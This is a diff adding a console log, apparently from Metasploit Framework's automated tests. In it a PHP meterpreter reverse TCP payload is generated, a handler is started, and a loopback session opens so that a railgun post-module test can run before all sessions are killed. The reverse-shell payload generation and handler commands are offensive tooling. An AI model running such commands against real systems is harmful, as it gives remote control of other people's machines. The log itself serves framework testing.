@@ -1,0 +1,37 @@
+D:/a/metasploit-framework/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/rex-core-0.1.31/lib/rex/compat.rb:381: warning: Win32API is deprecated after Ruby 1.9.1; use fiddle directly instead
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+msf6 > loadpath test/modules
+Loaded 39 modules:
+    14 auxiliary modules
+    13 exploit modules
+    12 post modules
+msf6 > use php/meterpreter_reverse_tcp
+msf6 payload(php/meterpreter_reverse_tcp) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-4920-c1hykqtxt
+msf6 payload(php/meterpreter_reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-4920-c1hykqtxt
+msf6 payload(php/meterpreter_reverse_tcp) > generate -o D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20231026-4920-tqamvi.php -f raw AutoVerifySessionTimeout=30 lport=6001 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/phpmeterpreter_reverse_tcp_debug_log20231026-4920-sjey0xtxt MeterpreterDebugBuild=true
+[*] Writing 34914 bytes to D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20231026-4920-tqamvi.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 0
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:50025) at 2023-10-26 19:04:08 +0000
+use test/railgun
+msf6 post(test/railgun) > run session=1 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod, stdapi_railgun_api, stdapi_railgun_memread
+[*] Running against session 1
+[*] Session type is meterpreter and platform is windows
+[*] SKIPPED: def test_api_function_calls_libc (target is not linux or osx)
+[*] SKIPPED: def test_api_function_file_info_windows (session does not support COMMAND_ID_STDAPI_RAILGUN_API)
+[*] SKIPPED: def test_api_function_calls_windows (session does not support COMMAND_ID_STDAPI_RAILGUN_API)
+[*] Testing complete in 0.0 seconds
+[*] Passed: 3; Failed: 0; Skipped: 3
+[*] Post module execution completed
+msf6 post(test/railgun) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 1 closed.
+msf6 post(test/railgun) > Stopping all jobs...
+msf6 post(test/railgun) > 
